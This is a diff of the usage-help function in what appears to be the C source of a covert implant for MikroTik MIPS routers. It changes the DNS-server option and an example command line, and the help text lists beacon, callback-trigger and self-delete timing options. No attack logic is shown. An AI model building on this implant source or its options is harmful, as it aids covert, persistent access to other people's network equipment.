@@ -95,7 +95,7 @@ static void printUsage(char* exeName)
 	printf("\t\t-d <beacon delay>      - initial beacon delay (in seconds, default: 2 minutes)\n");
 	printf("\t\t-t <callback delay>    - delay between trigger received and callback +/- 30 seconds (in seconds)\n");
 	printf("\t\t-s <self-delete delay> - since last successful trigger/beacon (in seconds, default: 60 days)\n");
-	printf("\t\t-S <IP address>        - DNS server IP address in dotted quad notation (required if beacon address is a domain name)\n");
+	printf("\t\t-S <IP1>[,<IP2>]       - DNS server IP address(es) in dotted quad notation (required if beacon address is a domain name)\n");
 	printf("\n\t\t-P <file path>       - directory path for .config and .log files (120 chars max)\n");
 #ifdef DEBUG
 	printf("\n\t\t-D <debug level>     - debug level between 1 and 9, higher numbers are more verbose\n");
@@ -103,7 +103,7 @@ static void printUsage(char* exeName)
 	printf("\t\t-h                     - print this help menu\n");
 
 	printf( "\n\tExample:\n" );
-	printf( "\t\t./hived-mikrotik-mips -a 10.3.2.76 -p 9999 -i 100000 -I hme0 -k Testing\n" );
+	printf( "\t\t./hived-mikrotik-mips -a 10.3.2.76 -p 9999 -i 3600 -k Testing\n" );
 	printf("\n");
 	return;
 }
